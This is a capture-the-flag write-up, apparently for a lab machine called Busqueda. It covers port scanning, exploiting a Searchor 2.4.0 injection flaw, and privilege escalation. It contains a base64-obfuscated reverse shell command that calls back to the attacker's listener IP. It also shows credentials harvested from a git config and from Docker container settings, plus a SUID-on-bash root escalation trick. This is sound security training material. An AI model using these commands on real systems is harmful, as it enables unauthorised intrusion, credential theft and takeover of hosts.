## Basic NMAP Scan:
```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Busqueda]
└─$ nmap 10.129.42.141 -T4                  
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-15 21:10 +0545
Nmap scan report for 10.129.42.141
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.42 seconds

```

## Let's start Enemuration with port 80:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Busqueda]
└─$ curl 10.129.42.141     
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://searcher.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.129.42.141 Port 80</address>
</body></html>

```
Need to add this to /etc/hosts file.

After browsing the site, we can find on the footer:
Powered by Flask and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor) which points to the github repo, on security advisory we can find that there is a [RCE](https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2) vulnerability in the version 2.4.0.

## Exploitation:

We can use [following](https://github.com/V35HR4J/Searchor-2.4.1-RCE) exploit:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Busqueda/Searchor-2.4.1-RCE]
└─$ python3 exploit.py http://searcher.htb/search "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMvMTIzNCAwPiYx|base64 -d|bash"
```

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ rev 1234
Tun0 IP: 10.10.14.23
python3 -c 'import pty;pty.spawn("/bin/bash")'
listening on [any] 1234 ...
connect to [10.10.14.23] from searcher.htb [10.129.42.141] 60406
sh: 0: can't access tty; job control turned off
$ whoami
svc
```

## Privilege Escalation:

```bash
We can find git config file in /var/www/app/.git/config

```bash
svc@busqueda:/var/www/app/.git$ cat config 
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

```

The password for svc user is reused, also we found new subdomain as gitea.searcher.htb, let's quickly add it to our /etc/hosts and further enemurate on ssh if we can find something.

```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```
Let's try to undertsand what this script does:

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   11 months ago   Up 39 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   11 months ago   Up 39 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

Okay so we know that, we can run docker-inspect command, it is possible to leak the config with the command, found through [this](https://docs.docker.com/engine/reference/commandline/inspect/) article about docker.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e|jq .
{
  "Hostname": "960873171e2e",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "22/tcp": {},
    "3000/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "USER=git",
    "GITEA_CUSTOM=/data/gitea"
  ],
  "Cmd": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "Image": "gitea/gitea:latest",
  "Volumes": {
    "/data": {},
    "/etc/localtime": {},
    "/etc/timezone": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "/usr/bin/entrypoint"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "server",
    "com.docker.compose.version": "1.29.2",
    "maintainer": "maintainers@gitea.io",
    "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
    "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
    "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
    "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
  }
}
```
We can find the password is reused, and now we have access to gitea server as administrator through this password.

Now, reviewing the code for scripts, we can find that we can actually run any command as root through full-checkup flag, below is the code snippet:

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

Let's create a file named full-checkup.sh in /tmp directory and add the following code:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Now we are root:

```bash
svc@busqueda:/tmp$ chmod +x full-checkup.sh 
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:/tmp$ /bin/bash -p
bash-5.1# cat /root/root.txt
a1e86be8967140570dddb993eec3b801
```

Takeaway:
- Developers are lazy, they reuse the passwords.
- Always check for the version of the software, and check for any exploits.